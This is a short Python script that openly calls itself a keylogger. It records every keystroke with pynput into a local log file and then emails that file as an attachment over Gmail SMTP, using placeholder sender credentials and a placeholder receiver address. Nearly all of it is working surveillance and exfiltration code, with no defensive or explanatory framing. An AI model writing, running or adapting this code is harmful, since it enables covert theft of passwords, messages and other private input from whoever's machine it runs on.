import smtplib

import pynput
from pynput.keyboard import Key, Listener
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key) 
    count += 1

    print("{0} pressed".format(key))


    f=open("log.txt","a")
    f.write(str(keys))
    f.close()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()




email_user = 'sendermail@gmail.com'
email_password = 'password'
email_send = 'receivermail@gmail.com'

subject = 'Keyloggers!!!'

msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject

body = 'Hi there, sending the log file'
msg.attach(MIMEText(body,'plain'))

filename='log.txt'
attachment  =open(filename,'rb')

part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= "+filename)

msg.attach(part)
text = msg.as_string()
server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(email_user,email_password)


server.sendmail(email_user,email_send,text)
server.quit()
